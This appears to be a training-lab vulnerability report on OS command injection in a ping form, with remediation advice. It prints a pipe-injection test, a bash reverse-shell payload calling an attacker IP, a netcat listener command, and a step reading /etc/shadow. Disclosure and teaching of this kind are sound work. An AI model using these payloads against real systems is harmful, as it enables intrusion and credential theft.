Vulnerability Report

CVE-ID: EDU-WEBLAB-2026-TEAM2-001

Title: OS Command Injection in Ping Functionality Leading to Remote Code Execution with Root Privileges

Affected Lab: shell-inject

Component: Ping Functionality - IP Address Input Field

Severity: Critical

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

CVSS Score: 10.0

Description:

A critical OS command injection vulnerability exists in the ping functionality of the shell-inject machine due to insufficient input validation on the IP address field. Attackers can inject arbitrary shell commands using metacharacters such as the pipe (|) operator, which are passed unsanitized to shell-dependent execution functions. This allows remote attackers to execute commands with root privileges, as demonstrated by obtaining a reverse shell with complete administrative access. The unauthenticated nature and trivial exploitation complexity make this an immediate critical security risk.

Proof of Concept:

bash

Initial test payload to confirm command injection vulnerability:

127.0.0.1 | whoami

Reverse shell payload for complete system compromise:

127.0.0.1 | bash -c "bash -i >& /dev/tcp/192.168.0.106/2222 0>&1"

Steps to Reproduce:

1. Navigate to the ping functionality page on the shell-inject machine's web interface

<img width="1379" height="562" alt="poc 1" src="https://github.com/user-attachments/assets/5ca77d88-2a24-4e6d-8b87-54ac025a749b" />

2. Enter a legitimate IP address (e.g., 127.0.0.1 or 8.8.8.8) in the IP address input field and submit the form

3. Verify that the application executes the ping command and returns standard ICMP echo results, confirming normal functionality

4. Test for command injection by entering the payload `127.0.0.1 | whoami` in the IP address input field

5. Submit the malicious request and observe that the output displays both ping results and the result of the `whoami` command, confirming successful OS command injection



6. On the attacker machine (Kali Linux at IP 192.168.0.106), open a terminal and start a Netcat listener on port 2222 using the command: `nc -lvnp 2222`

7. Return to the vulnerable ping functionality input field on the shell-inject machine

8. Enter the reverse shell payload: 127.0.0.1 | bash -c "bash -i >& /dev/tcp/192.168.0.106/2222 0>&1" and submit the request

9. Observe that a reverse shell connection is immediately established on the attacker's Netcat listener, providing an interactive shell session



10. Execute the command `id` or `whoami` in the reverse shell session to verify that the shell is running with root privileges

11. Confirm complete system compromise by executing additional commands such as `ls /root`, `cat /etc/shadow`, or other privileged operations that demonstrate full administrative access to the compromised system



Remediation:

1. Implement strict server-side input validation using allowlists that permit only valid IP address formats conforming to the regex pattern `^(\d{1,3}\.){3}\d{1,3}$` with additional range validation (0-255 per octet)

2. Completely eliminate the use of shell-dependent functions such as `system()`, `exec()`, `shell_exec()`, `passthru()`, or `popen()` that invoke command interpreters with user-controlled input

3. Replace dangerous command execution functions with secure alternatives such as native language libraries (e.g., use socket-based ICMP implementations or language-specific ping libraries instead of invoking the OS ping utility)

4. If system command execution is absolutely necessary, implement strict command parameterization using functions like `escapeshellarg()` and `escapeshellcmd()`, though complete avoidance of shell execution is strongly preferred

5. Apply the principle of least privilege by ensuring the web application runs under a non-privileged user account with minimal system permissions, never as root or with elevated privileges

6. Deploy a Web Application Firewall (WAF) configured with rules to detect and block command injection patterns including shell metacharacters (|, &, ;, $, `, \n, &&, ||, etc.)

7. Implement comprehensive logging and monitoring to detect suspicious command execution attempts, including alerting on unusual process spawning from web application contexts

Discovered By: Team 2

Date: February 8, 2026
